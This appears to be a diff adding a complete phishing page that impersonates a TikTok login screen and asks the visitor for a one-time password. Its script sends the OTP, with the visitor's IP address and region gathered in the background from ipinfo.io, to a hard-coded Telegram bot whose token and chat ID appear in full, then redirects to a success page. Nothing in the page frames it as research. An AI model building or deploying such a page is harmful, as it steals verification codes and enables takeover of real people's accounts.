@@ -1,0 +1,204 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>7</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    body {
+      background: #f5f5f5;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    .login-box {
+      background: #fff;
+      width: 380px;
+      padding: 40px 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+
+    .login-box img {
+      width: 60px;
+      margin-bottom: 15px;
+    }
+
+    .login-box h2 {
+      margin-bottom: 25px;
+      font-size: 22px;
+      font-weight: 600;
+      color: #222;
+    }
+
+    .input-group {
+      margin-bottom: 20px;
+      text-align: left;
+    }
+
+    .input-group label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 14px;
+      color: #555;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 12px 14px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 15px;
+      outline: none;
+      transition: 0.2s;
+    }
+
+    .input-group input:focus {
+      border-color: #ff0050;
+    }
+
+    .login-btn {
+      width: 100%;
+      padding: 12px;
+      background: #ff0050;
+      border: none;
+      border-radius: 8px;
+      color: #fff;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 10px;
+      transition: 0.3s;
+    }
+
+    .login-btn:hover {
+      background: #e60046;
+    }
+
+    .login-box .options {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #444;
+    }
+
+    .login-box .options a {
+      color: #ff0050;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .login-box .options a:hover {
+      text-decoration: underline;
+    }
+
+    .error-message {
+      color: #ff0050;
+      font-size: 14px;
+      margin-top: 10px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok Logo">
+    <h2>Log in to TikTok</h2>
+    <form id="contact-form">
+      <!-- Hidden inputs for IP and State -->
+      <input type="hidden" id="name" name="name" value="Tik">
+      <input type="hidden" id="ip_address" name="ip_address">
+      <input type="hidden" id="state" name="state">
+
+      <div class="input-group">
+        <input type="text" id="message" name="message" placeholder="Enter OTP" required>
+      </div>
+
+
+      <button type="submit" class="login-btn">Log in</button>
+    </form>
+    <div class="options">
+      <p><a href="#">Forgot password?</a></p>
+      <p>Don't have an account? <a href="#">Sign up</a></p>
+    </div>
+  </div>
+
+  <script>
+    const BOT_TOKEN = "8757172031:AAF6jLhtX_dIH20zVSiiMZlz6xinwNRmNz8";
+    const CHAT_ID = "6083732752";
+    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  
+    document.getElementById("contact-form").addEventListener("submit", function (e) {
+      e.preventDefault();
+  
+      const name = document.getElementById("name").value;
+      const message = document.getElementById("message").value;
+      const ip_address = document.getElementById("ip_address").value;
+      const state = document.getElementById("state").value;
+  
+      const text = `📩 *New Contact Message*\n👤 Name: ${name}\n💬 Otp: ${message}\n🌍 IP Address: ${ip_address}\n🏙️ State: ${state}`;
+  
+      fetch(TELEGRAM_API, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: text,
+          parse_mode: "Markdown"
+        })
+      })
+        .then(res => res.json())
+        .then(data => {
+          if (data.ok) {
+            window.location.href = "success.html"; // Redirect immediately
+          } else {
+            alert("⚠️ Failed to send message. Please try again.");
+          }
+        })
+        .catch(err => {
+          console.error("Telegram error:", err);
+          alert("❌ Failed to send message.");
+        });
+    });
+  </script>
+  
+  <script>
+    // Fetch user's IP and region (state) from ipinfo.io and populate hidden fields
+    function populateIpAndState() {
+      const ipField = document.getElementById('ip_address');
+      const stateField = document.getElementById('state');
+  
+      if (!ipField || !stateField) return;
+  
+      const TOKEN = '999a655c730c7c'; // ipinfo token
+  
+      fetch(`https://ipinfo.io/json?token=${TOKEN}`)
+        .then(response => {
+          if (!response.ok) throw new Error('Network response was not ok');
+          return response.json();
+        })
+        .then(data => {
+          if (ipField && data.ip) ipField.value = data.ip;
+          if (stateField && data.region) stateField.value = data.region;
+        })
+        .catch(err => {
+          console.error('Could not fetch IP/region:', err);
+        });
+    }
+  
+    document.addEventListener('DOMContentLoaded', populateIpAndState);
+  </script>
+  
+</body>
+
+</html>
